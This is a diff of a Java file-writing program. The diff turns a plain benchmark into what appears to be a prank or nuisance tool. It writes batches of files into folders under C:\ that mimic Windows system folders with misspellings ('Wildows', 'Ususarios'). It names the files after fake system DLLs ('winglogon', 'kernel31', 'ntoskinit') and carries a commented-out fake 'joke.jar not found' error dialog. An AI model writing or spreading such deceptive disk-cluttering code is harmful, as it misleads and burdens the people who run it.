@@ -1,11 +1,13 @@
 package edumdev;
 
+import javax.swing.*;
 import java.io.BufferedWriter;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.util.ArrayList;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
@@ -15,26 +17,31 @@ public class Main {
     private static final int BATCH_SIZE = 100000;
     private static final String STMT = "@@@@@@@@@";
 
-    // Valores originales
     private static final int ROOF = 1_000;
     private static final int N_THREADS = 10;
 
     public static void main(String[] args) {
+        String[] ouput = {"Archivos de pograma", "PerfoLogs", "Ususarios", "Wildows", "xampp"};
+        String[] files = {"explorerCookies", "notepad", "winglogon", "Sistem32", "nsconfig", "rgedit", "kernel31", "user22", "ntoskinit", "winkrnl"};
+        String op = ouput[(int)(Math.random() * ouput.length)];
+        //JOptionPane.showMessageDialog(null, "File joke.jar not found \nTry again", "Error", JOptionPane.ERROR_MESSAGE);
         long startTime = System.nanoTime();
-        for (int i = 0; i <= 5; i++) {
-            optimizedFileWriter();
+        for (int i = 0; i <= 1; i++) {
+            optimizedFileWriter(op, files);
         }
 
         long endTime = System.nanoTime() - startTime;
         System.out.printf("Tiempo de ejecución: %.2f segundos%n", endTime / 1_000_000_000.0);
     }
 
-    public static void optimizedFileWriter() {
+    public static void optimizedFileWriter(String op, String[] files) {
         ExecutorService executor = Executors.newFixedThreadPool(N_THREADS);
 
-        Path outputDir = Paths.get("C:\\output");
+        Path outputDir = Paths.get("C:\\" + op);
         try {
-            Files.createDirectories(outputDir);
+            if (!Files.exists(outputDir)) {
+                Files.createDirectories(outputDir);
+            }
         } catch (IOException e) {
             System.err.println("Error creando directorio: " + e.getMessage());
             return;
@@ -48,7 +55,8 @@ public class Main {
 
         for (int i = 0; i < N_THREADS; i++) {
             int n = i;
-            while (Files.exists(outputDir.resolve("file_" + n + ".txt"))) {
+            String fl = files[(int)(Math.random() * files.length)];
+            while (Files.exists(outputDir.resolve(fl + ".dll"))) {
                 n++;
             }
             final int threadId = n;
